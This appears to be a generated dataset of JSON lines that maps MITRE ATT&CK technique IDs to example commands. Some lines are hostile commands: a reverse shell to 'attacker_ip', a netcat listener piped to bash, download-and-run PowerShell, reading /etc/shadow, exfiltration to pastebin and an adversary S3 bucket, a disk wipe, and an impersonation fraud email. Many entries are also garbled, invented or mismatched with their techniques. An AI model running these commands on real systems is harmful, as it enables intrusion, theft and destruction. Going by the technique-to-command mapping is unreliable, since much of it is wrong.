+{"mitre_id": "T1597", "name": "Search Closed Sources", "platform": "PRE", "command": "python requests.get('https://example.com/private_database')"}
+{"mitre_id": "T1053.006", "name": "Systemd Timers", "platform": "Linux", "command": "systemd-tmpfiles-clean.timer"}
+{"mitre_id": "T1566", "name": "Phishing", "platform": "Identity Provider", "command": "`Get-ADUser -Filter * | Set-ADUser -Replace @{extensionAttribute1='phishing email received'}`"}
+{"mitre_id": "T1061", "name": "Graphical User Interface", "platform": "Linux", "command": "xdotool click 1"}
+{"mitre_id": "T1542.004", "name": "ROMMONkit", "platform": "Network Devices", "command": "copy tftp://<adversary_ip>/rommon_image.bin rommon"}
+{"mitre_id": "T1218.001", "name": "Compiled HTML File", "platform": "Windows", "command": "`powershell -c \"Add-Type -TypeDefinition '[DllImport(\\\"user32.dll\\\")] public static extern int MessageBox(int hWnd, string text, string caption, int buttons);'; [chmhelp::CHMHelper]::ExtractFile('path_to_malicious_chm_file.chm', 'path_to_extracted_file.exe')\"`"}
+{"mitre_id": "T1496.001", "name": "Compute Hijacking", "platform": "Windows", "command": "taskkill /f /im bminer.exe"}
+{"mitre_id": "T1070.005", "name": "Network Share Connection Removal", "platform": "Windows", "command": "net use \\\\system\\share /delete"}
+{"mitre_id": "T1090.003", "name": "Multi-hop Proxy", "platform": "ESXi", "command": "esxcli network ip route add -p 10.0.0.1 -g 10.0.0.2 -h 10.0.0.3 -r 10.0.0.4"}
+{"mitre_id": "T1110", "name": "Brute Force", "platform": "Containers", "command": "cracklib -b /usr/share/dict/words -l 8 -p 10 -t 1 -f /tmp/brute_force.log"}
+{"mitre_id": "T1059.004", "name": "Unix Shell", "platform": "ESXi", "command": "vmware-cmd -g 0:0 \"reboot\""}
+{"mitre_id": "T1137.003", "name": "Outlook Forms", "platform": "Windows", "command": "`reg add \"HKCU\\Software\\Microsoft\\Office\\Outlook\\Form Regions\" /v \"FormRegion1\" /t REG_SZ /d \"VBS:malicious_form.vbs\"`"}
+{"mitre_id": "T1219.003", "name": "Remote Access Hardware", "platform": "Linux", "command": "`ssh -L 8080:localhost:22 tiny@target_ip`"}
+{"mitre_id": "T1157", "name": "Dylib Hijacking", "platform": "macOS", "command": "`cp /path/to/malicious.dylib /Applications/Application\\ Name.framework/Versions/Current/Resources/`"}
+{"mitre_id": "T1562.001", "name": "Disable or Modify Tools", "platform": "Containers", "command": "docker run --security-opt no-newPrivileges=true"}
+{"mitre_id": "T1565", "name": "Data Manipulation", "platform": "Linux", "command": "`echo \"Hello, World!\" > /etc/passwd`"}
+{"mitre_id": "T1559", "name": "Inter-Process Communication", "platform": "Linux", "command": "mkfifo /tmp/pipe; nc -l -p 1234 < /tmp/pipe | bash"}
+{"mitre_id": "T1001", "name": "Data Obfuscation", "platform": "ESXi", "command": "vmknic -d 1000 -m 1000 -p 8080 -v 192.168.1.100"}
+{"mitre_id": "T1039", "name": "Data from Network Shared Drive", "platform": "Linux", "command": "ls /mnt/network-share/"}
+{"mitre_id": "T1584.006", "name": "Web Services", "platform": "PRE", "command": "python -c 'import requests; s=requests.Session(); s.post(\"https://example.com\", data={\"key\":\"value\"})'"}
+{"mitre_id": "T1601", "name": "Modify System Image", "platform": "Network Devices", "command": "`mv /path/to/original/os/file /path/to/original/os/file.bak && cp /path/to/malicious/os/file /path/to/original/os/file`"}
+{"mitre_id": "T1574", "name": "Hijack Execution Flow", "platform": "Linux", "command": "`echo 'export PATH=$PATH:/usr/local/bin/malicious' >> ~/.bashrc`"}
+{"mitre_id": "T1036.012", "name": "Browser Fingerprint", "platform": "Linux", "command": "`curl -s -A \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\"`"}
+{"mitre_id": "T1059.011", "name": "Lua", "platform": "Linux", "command": "`lua -e 'os.execute(\"ls\")'`"}
+{"mitre_id": "T1027.005", "name": "Indicator Removal from Tools", "platform": "Linux", "command": "`mv /path/to/malicious/file /path/to/malicious/file.bak && cp /path/to/malicious/file.bak /path/to/malicious/file`"}
+{"mitre_id": "T1204.003", "name": "Malicious Image", "platform": "IaaS", "command": "aws ec2 run-instances --image-id <malicious_image_id>"}
+{"mitre_id": "T1543.005", "name": "Container Service", "platform": "Containers", "command": "docker run -d --restart=always malicious_container"}
+{"mitre_id": "T1078", "name": "Valid Accounts", "platform": "Containers", "command": "`docker run -it --rm -v /path/to/credentials:/credentials:ro --net=none --privileged --name vulnerable-app vulnerable-app-image`"}
+{"mitre_id": "T1571", "name": "Non-Standard Port", "platform": "ESXi", "command": "vmkping -p 8088 <target_IP>"}
+{"mitre_id": "T1585.001", "name": "Social Media Accounts", "platform": "PRE", "command": "python create_persona.py"}
+{"mitre_id": "T1073", "name": "DLL Side-Loading", "platform": "Windows", "command": "`reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SideBySide\\WinSxS\\Manifests\" /v \"DLLName\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\"`"}
+{"mitre_id": "T1055.012", "name": "Process Hollowing", "platform": "Windows", "command": "CreateProcessA(0x1000, \"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL); ZwUnmapViewOfSection(NULL, NULL); WriteProcessMemory(NULL, 0x1000, \"malicious code\", 0x1000, NULL); VirtualAllocEx(NULL, 0x1000, 0x1000, 0x1000, 0x40); SetThreadContext(NULL, 0x1000, 0x1000); ResumeThread(NULL);"}
+{"mitre_id": "T1068", "name": "Exploitation for Privilege Escalation", "platform": "Containers", "command": "docker run -it --privileged --rm -v /:/mnt -v /proc:/proc:ro -v /sys:/sys:ro -v /dev:/dev:rw -v /etc:/etc:ro -v /lib:/lib:ro -v /lib64:/lib64:ro -v /usr:/usr:ro -v /var:/var:ro -v /tmp:/tmp:rw -v /home:/home:ro -v /root:/root:ro -v /boot:/boot:ro -v /media:/media:ro -v /mnt:/mnt:rw -"}
+{"mitre_id": "T1564.009", "name": "Resource Forking", "platform": "macOS", "command": "`xattr -l`"}
+{"mitre_id": "T1531", "name": "Account Access Removal", "platform": "Linux", "command": "passwd -l username"}
+{"mitre_id": "T1110.004", "name": "Credential Stuffing", "platform": "Windows", "command": "nmap -p 3389 192.168.1.100"}
+{"mitre_id": "T1208", "name": "Kerberoasting", "platform": "Windows", "command": "klist tgt /li"}
+{"mitre_id": "T1027", "name": "Obfuscated Files or Information", "platform": "ESXi", "command": "vmkfstools -D -f gzip -i /path/to/file.vmdk"}
+{"mitre_id": "T1556.006", "name": "Multi-Factor Authentication", "platform": "Windows", "command": "`netsh.exe hostsv4 add host \"mfa.example.com\" 127.0.0.1`"}
+{"mitre_id": "T1114.002", "name": "Remote Email Collection", "platform": "Windows", "command": "powershell -c \"Get-MailboxStatistics -Server <server_name> | Select-Object -ExpandProperty TotalItemsInDatabase\""}
+{"mitre_id": "T1505.004", "name": "IIS Components", "platform": "Windows", "command": "net stop w3svc"}
+{"mitre_id": "T1036.001", "name": "Invalid Code Signature", "platform": "Windows", "command": "signtool.exe /f \"C:\\path\\to\\file.exe\" /fd1 /t v3"}
+{"mitre_id": "T1564.006", "name": "Run Virtual Instance", "platform": "Linux", "command": "vmware-cmd -g /path/to/.vmx file_name.vmx"}
+{"mitre_id": "T1154", "name": "Trap", "platform": "Linux", "command": "trap 'echo \"Exiting gracefully\"; exit 0' INT QUIT TSTP"}
+{"mitre_id": "T1027.014", "name": "Polymorphic Code", "platform": "Windows", "command": "`mssehacker.exe -c \"cmd /c calc\"`"}
+{"mitre_id": "T1201", "name": "Password Policy Discovery", "platform": "Windows", "command": "net accounts /domain"}
+{"mitre_id": "T1546", "name": "Event Triggered Execution", "platform": "Linux", "command": "`sudo auditctl -w /path/to/malicious/script -p rwx -k malicious_event`"}
+{"mitre_id": "T1546.004", "name": "Unix Shell Configuration Modification", "platform": "Linux", "command": "echo'malicious_command' >> /etc/profile"}
+{"mitre_id": "T1187", "name": "Forced Authentication", "platform": "Windows", "command": "net use \\\\[remote address]\\pic.png /u:%username%"}
+{"mitre_id": "T1134.005", "name": "SID-History Injection", "platform": "Windows", "command": "net localgroup \"Enterprise Admins\" /add \"BUILTIN\\Enterprise Admins\""}
+{"mitre_id": "T1599", "name": "Network Boundary Bridging", "platform": "Network Devices", "command": "`show running-config`"}
+{"mitre_id": "T1486", "name": "Data Encrypted for Impact", "platform": "ESXi", "command": "vmware-cmd -g \"shutdown guest\""}
+{"mitre_id": "T1488", "name": "Disk Content Wipe", "platform": "Linux", "command": "dd if=/dev/urandom of=/dev/sdb bs=4096 count=100"}
+{"mitre_id": "T1553", "name": "Subvert Trust Controls", "platform": "Windows", "command": "certutil.exe -SETCATATTRIB -l \"Trusted Publisher\" %windir%\\System32\\cmd.exe"}
+{"mitre_id": "T1548.004", "name": "Elevated Execution with Prompt", "platform": "macOS", "command": "AuthorizationExecuteWithPrivileges(\"/path/to/malicious/command\")"}
+{"mitre_id": "T1592.003", "name": "Firmware", "platform": "PRE", "command": "python search_open_technical_databases"}
+{"mitre_id": "T1573", "name": "Encrypted Channel", "platform": "ESXi", "command": "`esxcli network ip route set --gateway=192.168.1.1 --interface=vmk0`"}
+{"mitre_id": "T1174", "name": "Password Filter DLL", "platform": "Windows", "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Login Profiles\" /v \"PasswordFilterDLL\" /t REG_SZ /d \"C:\\path\\to\\malicious_filter.dll\""}
+{"mitre_id": "T1547.002", "name": "Authentication Package", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1218.010", "name": "Regsvr32", "platform": "Windows", "command": "regsvr32 /s /u \"%windir%\\system32\\cmd.dll,cmdclass\""}
+{"mitre_id": "T1002", "name": "Data Compressed", "platform": "Linux", "command": "`rar a -r -b -ep1 -m5 -m0 -inul /tmp/output.rar /tmp/input.txt`"}
+{"mitre_id": "T1567.003", "name": "Exfiltration to Text Storage Sites", "platform": "Linux", "command": "curl -s 'https://pastebin.com/paste' -d 'your_data_here'"}
+{"mitre_id": "T1081", "name": "Credentials in Files", "platform": "Windows", "command": "dir C:\\Users\\* /s /b *.cred *.config *.txt"}
+{"mitre_id": "T1592.002", "name": "Software", "platform": "PRE", "command": "nmap -sV <target_IP>"}
+{"mitre_id": "T1128", "name": "Netsh Helper DLL", "platform": "Windows", "command": "netsh exec=\"C:\\path\\to\\helper.dll\""}
+{"mitre_id": "T1056", "name": "Input Capture", "platform": "Linux", "command": "`tcpdump -i any -A -s 0 -c 1 -w capture.pcap \"tcp port 80 and host 192.168.1.100\"`"}
+{"mitre_id": "T1566.004", "name": "Spearphishing Voice", "platform": "Linux", "command": "`sudo apt install espeak`"}
+{"mitre_id": "T1587.004", "name": "Exploits", "platform": "PRE", "command": "python exploit.py"}
+{"mitre_id": "T1593.001", "name": "Social Media", "platform": "PRE", "command": "twitter search \"victim organization name\""}
+{"mitre_id": "T1213.004", "name": "Customer Relationship Management Software", "platform": "SaaS", "command": "`az login`"}
+{"mitre_id": "T1546.015", "name": "Component Object Model Hijacking", "platform": "Windows", "command": "reg add \"HKCR\\TypeLib\\{guid}\" /v \"InprocServer32\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1589.001", "name": "Credentials", "platform": "PRE", "command": "python -c 'import requests; r = requests.get(\"https://example.com\"); print(r.cookies)'"}
+{"mitre_id": "T1195.002", "name": "Compromise Software Supply Chain", "platform": "Linux", "command": "`git add. && git commit -m \"malicious commit\" && git push origin master`"}
+{"mitre_id": "T1036.003", "name": "Rename Legitimate Utilities", "platform": "Linux", "command": "mv /bin/rundll32.exe /bin/renamed_rundll32.exe"}
+{"mitre_id": "T1102.002", "name": "Bidirectional Communication", "platform": "Linux", "command": "`curl -s -X POST -H \"Content-Type: application/json\" -d '{\"command\": \"ls -l\"}' https://example.com/command`"}
+{"mitre_id": "T1203", "name": "Exploitation for Client Execution", "platform": "Linux", "command": "`nmap -sC <target_IP>`"}
+{"mitre_id": "T1595.003", "name": "Wordlist Scanning", "platform": "PRE", "command": "dirb http://target.com"}
+{"mitre_id": "T1667", "name": "Email Bombing", "platform": "Linux", "command": "`python -c 'import smtplib; s = smtplib.SMTP(\"smtp.gmail.com\"); s.sendmail(\"attacker@gmail.com\", \"victim@example.com\", \"Subject: Test\\nFrom: attacker@gmail.com\\nTo: victim@example.com\\n\\nThis is a test email.\")'`"}
+{"mitre_id": "T1562.011", "name": "Spoof Security Alerting", "platform": "Windows", "command": "net stop winmgmt && net start winmgmt"}
+{"mitre_id": "T1137.004", "name": "Outlook Home Page", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Preferences\" /v \"Home Page\" /t REG_SZ /d \"http://example.com/malicious_page.html\" /f"}
+{"mitre_id": "T1573.002", "name": "Asymmetric Cryptography", "platform": "ESXi", "command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout private_key.pem -out public_key.pem -days 365"}
+{"mitre_id": "T1567.002", "name": "Exfiltration to Cloud Storage", "platform": "ESXi", "command": "`vmware-cmd -g /vmfs/volumes/.../vmname/.../vmname.vmx set extraConfig.add(\"vmx.disallowGuestCloudStorage\", \"false\")`"}
+{"mitre_id": "T1570", "name": "Lateral Tool Transfer", "platform": "ESXi", "command": "esxcli storage filesystem filesystem.add --type=vmfs --disk=vmfs --label=tool_transfer"}
+{"mitre_id": "T1574.009", "name": "Path Interception by Unquoted Path", "platform": "Windows", "command": "cmd /c \"C:\\program files\\myapp.exe\""}
+{"mitre_id": "T1608.003", "name": "Install Digital Certificate", "platform": "PRE", "command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -subj \"/C=US/ST=State/L=Locality/O=Organization/CN=server\""}
+{"mitre_id": "T1168", "name": "Local Job Scheduling", "platform": "Linux", "command": "0 0 * * * /path/to/command"}
+{"mitre_id": "T1166", "name": "Setuid and Setgid", "platform": "Linux", "command": "chmod u+s /path/to/file"}
+{"mitre_id": "T1037.005", "name": "Startup Items", "platform": "macOS", "command": "mv /Library/StartupItems/MyItem/StartupParameters.plist /Library/StartupItems/MyItem/StartupParameters.plist"}
+{"mitre_id": "T1100", "name": "Web Shell", "platform": "Linux", "command": "python -c 'import os; os.system(\"bash -i >& /dev/tcp/attacker_ip/8080 0>&1\")'"}
+{"mitre_id": "T1186", "name": "Process Doppelgänging", "platform": "Windows", "command": "`CreateTransaction`"}
+{"mitre_id": "T1184", "name": "SSH Hijacking", "platform": "Linux", "command": "ssh -x -L 8080:localhost:8080 user@target_host"}
+{"mitre_id": "T1614.001", "name": "System Language Discovery", "platform": "Linux", "command": "locale"}
+{"mitre_id": "T1095", "name": "Non-Application Layer Protocol", "platform": "ESXi", "command": "vmware.esxcli vm process list"}
+{"mitre_id": "T1075", "name": "Pass the Hash", "platform": "Windows", "command": "net only: runas /netonly /user:username /user:password"}
+{"mitre_id": "T1059.013", "name": "Container CLI/API", "platform": "Containers", "command": "docker run -it --rm -v /:/host -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c \"docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' host\""}
+{"mitre_id": "T1027.003", "name": "Steganography", "platform": "Linux", "command": "steghide embed -cf /dev/null -xf /tmp/output.txt -z bzip2 -a v -p password -i /path/to/image.png"}
+{"mitre_id": "T1584.002", "name": "DNS Server", "platform": "PRE", "command": "nmap -sS -Pn -p 53 8.8.8.8"}
+{"mitre_id": "T1671", "name": "Cloud Application Integration", "platform": "Office Suite", "command": "az ad sp create-for-rbac --name \"malicious-application\" --role \"Contributor\" --scopes \"https://graph.microsoft.com/.default\""}
+{"mitre_id": "T1001.003", "name": "Protocol or Service Impersonation", "platform": "ESXi", "command": "esxcli network firewall ruleset -a 80 -r allow"}
+{"mitre_id": "T1012", "name": "Query Registry", "platform": "Windows", "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""}
+{"mitre_id": "T1030", "name": "Data Transfer Size Limits", "platform": "Linux", "command": "`nc -w 1 -e /bin/bash 192.168.1.100 80 0< /dev/urandom | gzip -dc | nc -w 1 192.168.1.100 80 > /dev/null`"}
+{"mitre_id": "T1028", "name": "Windows Remote Management", "platform": "Windows", "command": "winrm -r -r:https://example.com -username:username -password:password -auth:ntlm -grantingtickets -config:https://example.com/winrm/config -enablesignedcertificates -skipcertificatevalidation -skipCACheck -skipCNCheck -skipthumbprintCheck -skiprevocationserverCheck -skipdomainjoinCheck -skipmachinekeyCheck -skipmachineidentityCheck -skipmachineidentityproviderCheck -skipmachineidentityproviderTypeCheck -skipmachineidentityproviderTypeCheck -skipmachineidentityproviderTypeCheck -skipmachineidentityproviderTypeCheck -skipmachineidentityproviderTypeCheck -skipmachineidentityprovider"}
+{"mitre_id": "T1550.004", "name": "Web Session Cookie", "platform": "SaaS", "command": "curl -c cookies.txt 'https://example.saasapp.com'"}
+{"mitre_id": "T1078.002", "name": "Domain Accounts", "platform": "ESXi", "command": "esxcli getvms | grep \"root\""}
+{"mitre_id": "T1218.009", "name": "Regsvcs/Regasm", "platform": "Windows", "command": "regasm /codebase /uninstall \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1034", "name": "Path Interception", "platform": "Windows", "command": "net user"}
+{"mitre_id": "T1546.018", "name": "Python Startup Hooks", "platform": "Linux", "command": "echo 'import os; os.system(\"python -c 'import os; os.system(\\\"rm /tmp/persistence_script.py\\\")'\")' > /usr/lib/python3.x/site-packages/persistence.pth"}
+{"mitre_id": "T1506", "name": "Web Session Cookie", "platform": "Office 365", "command": "Get-Content -Path \"C:\\path\\to\\cookie.txt\" | Invoke-WebRequest -Uri \"https://login.microsoftonline.com/login.srf\" -Method Post -Body @{\"login\": \"\", \"passwd\": \"\", \"Cookie\": @{\"Cookie\": \"\"} }"}
+{"mitre_id": "T1553.004", "name": "Install Root Certificate", "platform": "Linux", "command": "sudo certmgr -t -a -f /path/to/malicious/cert"}
+{"mitre_id": "T1037.003", "name": "Network Logon Script", "platform": "Windows", "command": "net localgroup \"Remote Desktop Users\" /add \"Domain Admins\""}
+{"mitre_id": "T1499", "name": "Endpoint Denial of Service", "platform": "Windows", "command": "netstat -an"}
+{"mitre_id": "T1027.004", "name": "Compile After Delivery", "platform": "Linux", "command": "gcc -o output payload.c"}
+{"mitre_id": "T1065", "name": "Uncommonly Used Port", "platform": "Linux", "command": "nc -v -p 12345 <target_IP>"}
+{"mitre_id": "T1614", "name": "System Location Discovery", "platform": "IaaS", "command": "aws ec2 describe-instance-attribute --attribute group=\"placement\""}
+{"mitre_id": "T1564.007", "name": "VBA Stomping", "platform": "Linux", "command": "`python -c 'import pefile; pe = pefile.PE(\"malicious_doc.docm\"); pe.parse_data_ofs(0x1000); pe.set_data(pe.OPTIONAL_HEADER.DATA, b\"\\x00\"*pe.OPTIONAL_HEADER.DATA_SIZE)'`"}
+{"mitre_id": "T1197", "name": "BITS Jobs", "platform": "Windows", "command": "bitsadmin /transfer \"http://example.com/malicious_file.exe /download /priority high\""}
+{"mitre_id": "T1127.001", "name": "MSBuild", "platform": "Windows", "command": "`msbuild.exe C:\\path\\to\\malicious.msbuild /t:Build /p:Configuration=Release /p:TargetFrameworkVersion=v4.5`"}
+{"mitre_id": "T1656", "name": "Impersonation", "platform": "Linux", "command": "`sudo python -c 'import smtplib; s = smtplib.SMTP(\"smtp.gmail.com\", 587); s.starttls(); s.login(\"impersonated_email@gmail.com\", \"password\"); s.sendmail(\"impersonated_email@gmail.com\", \"victim_email@example.com\", \"Subject: Urgent: Payment Request\\nDear Victim,\\nPlease send money to the bank account below.\\nBest regards,\\nImpersonated Executive\")'`"}
+{"mitre_id": "T1578.005", "name": "Modify Cloud Compute Configurations", "platform": "IaaS", "command": "az update resource group --name MyResourceGroup --tags Environment=prod --location westus2"}
+{"mitre_id": "T1088", "name": "Bypass User Account Control", "platform": "Windows", "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,RunDLL32C:\\Windows\\System32\\comsvcs.dll,RunDLL32"}
+{"mitre_id": "T1494", "name": "Runtime Data Manipulation", "platform": "Linux", "command": "`echo \"Hello, World!\" | sed's/World/Earth/'`"}
+{"mitre_id": "T1090.004", "name": "Domain Fronting", "platform": "Linux", "command": "openssl s_client -connect example.com:443 -servername example.net -servername example.com -servername example.io"}
+{"mitre_id": "T1557.002", "name": "ARP Cache Poisoning", "platform": "Linux", "command": "`arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.2`"}
+{"mitre_id": "T1562.008", "name": "Disable or Modify Cloud Logs", "platform": "IaaS", "command": "az vm disable-chosen-logging"}
+{"mitre_id": "T1518.001", "name": "Security Software Discovery", "platform": "IaaS", "command": "aws cloudwatch get-logs --log-group-name /aws/CloudWatchAgentLogGroup"}
+{"mitre_id": "T1564.003", "name": "Hidden Window", "platform": "Linux", "command": "xset -q -display :0 -screen 0 0 0"}
+{"mitre_id": "T1493", "name": "Transmitted Data Manipulation", "platform": "Linux", "command": "`tcpdump -i eth0 -s 0 -w captured_traffic.pcap -vv -n -c 1000`"}
+{"mitre_id": "T1127.002", "name": "ClickOnce", "platform": "Windows", "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication1"}
+{"mitre_id": "T1059.006", "name": "Python", "platform": "ESXi", "command": "python -c 'import os; os.system(\"powershell -c \\\"Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -like \\\"*vmware-tools*\\\"} | Remove-WmiObject\\\"\")'"}
+{"mitre_id": "T1070.010", "name": "Relocate Malware", "platform": "Linux", "command": "cp /path/to/malware /new/path/malware_copy"}
+{"mitre_id": "T1591.004", "name": "Identify Roles", "platform": "PRE", "command": "python social_media_scanner.py"}
+{"mitre_id": "T1132", "name": "Data Encoding", "platform": "Linux", "command": "base64 -d <<< \"SGVsbG8gd29ybGQ=\" > encoded_data.txt"}
+{"mitre_id": "T1546.010", "name": "AppInit DLLs", "platform": "Windows", "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs"}
+{"mitre_id": "T1598", "name": "Phishing for Information", "platform": "PRE", "command": "`powershell -c \"Add-Type -AssemblyName System.Windows.Forms; $w = New-Object System.Windows.Forms.Form; $w.Text = 'Phishing for Information'; $w.ShowDialog()\"`"}
+{"mitre_id": "T1496", "name": "Resource Hijacking", "platform": "Windows", "command": "taskkill /f /im cryptominer.exe"}
+{"mitre_id": "T1585", "name": "Establish Accounts", "platform": "PRE", "command": "python setup.py install"}
+{"mitre_id": "T1588", "name": "Obtain Capabilities", "platform": "PRE", "command": "`powershell -c \"Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile C:\\malware.exe\"`"}
+{"mitre_id": "T1546.002", "name": "Screensaver", "platform": "Windows", "command": "reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.exe /t REG_SZ /d \"C:\\path\\to\\malicious\\scr\\file.scr\" /f"}
+{"mitre_id": "T1147", "name": "Hidden Users", "platform": "macOS", "command": "sudo dscl. -create /Users/username UniqueID 401"}
+{"mitre_id": "T1556.009", "name": "Conditional Access Policies", "platform": "IaaS", "command": "aws iam put-instance-profile --instance-profile-document file://path/to/policy.json"}
+{"mitre_id": "T1578.002", "name": "Create Cloud Instance", "platform": "IaaS", "command": "aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --key-name my_key --security-groups my_security_group"}
+{"mitre_id": "T1500", "name": "Compile After Delivery", "platform": "Linux", "command": "gcc -o output payload.c"}
+{"mitre_id": "T1555.006", "name": "Cloud Secrets Management Stores", "platform": "IaaS", "command": "aws secretsmanager get-secret-value --secret-id secret_id"}
+{"mitre_id": "T1213.003", "name": "Code Repositories", "platform": "SaaS", "command": "git ls-remote https://github.com/user/repository.git"}
+{"mitre_id": "T1565.002", "name": "Transmitted Data Manipulation", "platform": "Linux", "command": "`tcpdump -i eth0 -s 0 -w captured_traffic.pcap -vv -n -c 1000`"}
+{"mitre_id": "T1003.008", "name": "/etc/passwd and /etc/shadow", "platform": "Linux", "command": "cat /etc/passwd /etc/shadow"}
+{"mitre_id": "T1543.001", "name": "Launch Agent", "platform": "macOS", "command": "launchctl load /Library/LaunchAgents/<malicious_plist_file>.plist"}
+{"mitre_id": "T1569", "name": "System Services", "platform": "Windows", "command": "sc config wuauserv start= auto & net start wuauserv"}
+{"mitre_id": "T1059.003", "name": "Windows Command Shell", "platform": "Windows", "command": "cmd /c \"powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/malicious.ps1')\"\""}
+{"mitre_id": "T1055.009", "name": "Proc Memory", "platform": "Linux", "command": "dd if=/dev/zero of=/proc/[pid]/mem bs=1 count=1"}
+{"mitre_id": "T1223", "name": "Compiled HTML File", "platform": "Windows", "command": "hh.exe /a /f \"path\\to\\malicious.chm\""}
+{"mitre_id": "T1650", "name": "Acquire Access", "platform": "PRE", "command": "python acquire_access.py"}
+{"mitre_id": "T1601.001", "name": "Patch System Image", "platform": "Network Devices", "command": "copy tftp://<IP address of the compromised image> <filename>"}
+{"mitre_id": "T1558.002", "name": "Silver Ticket", "platform": "Windows", "command": "klist /kptgt"}
+{"mitre_id": "T1213", "name": "Data from Information Repositories", "platform": "Linux", "command": "`nmap -p 3306 -script http-headers,ssl-enum-ciphers -sV 192.168.1.100`"}
+{"mitre_id": "T1070.009", "name": "Clear Persistence", "platform": "ESXi", "command": "esxcli vm process kill --type=all --vm=<vm-name>"}
+{"mitre_id": "T1059.012", "name": "Hypervisor CLI", "platform": "ESXi", "command": "esxcli vm process kill --type=soft --vm=<vm-name>"}
+{"mitre_id": "T1146", "name": "Clear Command History", "platform": "Linux", "command": "history -c"}
+{"mitre_id": "T1555.004", "name": "Windows Credential Manager", "platform": "Windows", "command": "vaultcmd.exe /listall"}
+{"mitre_id": "T1036.010", "name": "Masquerade Account Name", "platform": "Linux", "command": "`az ad sp create-for-rbac --name \"service_account_name\"`"}
+{"mitre_id": "T1519", "name": "Emond", "platform": "macOS", "command": "launchctl load /System/Library/LaunchDaemons/com.apple.emond.plist"}
+{"mitre_id": "T1194", "name": "Spearphishing via Service", "platform": "Windows", "command": "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com/malicious.exe' -OutFile C:\\Users\\Target\\Downloads\\malicious.exe\""}
+{"mitre_id": "T1200", "name": "Hardware Additions", "platform": "Windows", "command": "`wmic.exe process where \"imagename='svchost.exe'\" call create \"C:\\path\\to\\malicious\\driver.sys\"`"}
+{"mitre_id": "T1219.002", "name": "Remote Desktop Software", "platform": "Linux", "command": "`vncviewer`"}
+{"mitre_id": "T1505", "name": "Server Software Component", "platform": "Windows", "command": "powershell -ExecutionPolicy Bypass -Command \"Add-Type -TypeDefinition '[DllImport(\\\"kernel32.dll\\\")] public class Win32 : System.Runtime.InteropServices.Marshal.Aspect { [return: MarshalAs(UnmanagedType.Bool)] public static extern bool MoveFileEx(string lpFileName, uint dwMoveOperation, uint dwFlags); }'; $file = 'C:\\path\\to\\malicious.dll'; Win32::MoveFileEx($file, 0x00000001, 0x00000002)\""}
+{"mitre_id": "T1485", "name": "Data Destruction", "platform": "Containers", "command": "docker rm -f"}
+{"mitre_id": "T1132.002", "name": "Non-Standard Encoding", "platform": "ESXi", "command": "vmware-cmd -g /vmfs/volumes/.../vmname/vmname.vmx -e \"set extraConfig.encoding 'utf-8'\""}
+{"mitre_id": "T1556.001", "name": "Domain Controller Authentication", "platform": "Windows", "command": "net stop lsass"}
+{"mitre_id": "T1537", "name": "Transfer Data to Cloud Account", "platform": "IaaS", "command": "aws s3 sync s3://victim-bucket s3://adversary-bucket"}
+{"mitre_id": "T1027.006", "name": "HTML Smuggling", "platform": "Windows", "command": "javascript:eval(atob('dmVyc2lvbiBodHRwczovL2NvbnRlcmxpbmdzLmNvbS9tYWNhZGVteS9zdHJlZS5waHA='));"}
+{"mitre_id": "T1556.005", "name": "Reversible Encryption", "platform": "Windows", "command": "Set-ADUser -AllowReversiblePasswordEncryption $true"}
+{"mitre_id": "T1027.010", "name": "Command Obfuscation", "platform": "Linux", "command": "`mkdir -p '/tmp/$(echo $RANDOM)`"}
+{"mitre_id": "T1130", "name": "Install Root Certificate", "platform": "Linux", "command": "sudo certmgr trust -d -f -i /path/to/malicious/cert"}
+{"mitre_id": "T1022", "name": "Data Encrypted", "platform": "Linux", "command": "`rar a -hp -r -ep1 -inul -o- encrypted_data.rar /path/to/data`"}
+{"mitre_id": "T1070.004", "name": "File Deletion", "platform": "ESXi", "command": "rm"}
+{"mitre_id": "T1189", "name": "Drive-by Compromise", "platform": "Identity Provider", "command": "curl -X 'GET' 'https://example.com/malicious-script'"}
+{"mitre_id": "T1498", "name": "Network Denial of Service", "platform": "Windows", "command": "netstat -an"}
+{"mitre_id": "T1651", "name": "Cloud Administration Command", "platform": "IaaS", "command": "aws ssm send-command --document-name \"AWS-RunShellScript\" --targets \"Key='InstanceIds',Values=['i-0123456789abcdef0']\" --parameters '{\"commands\": [\"ls -l\"]}' --output-text"}
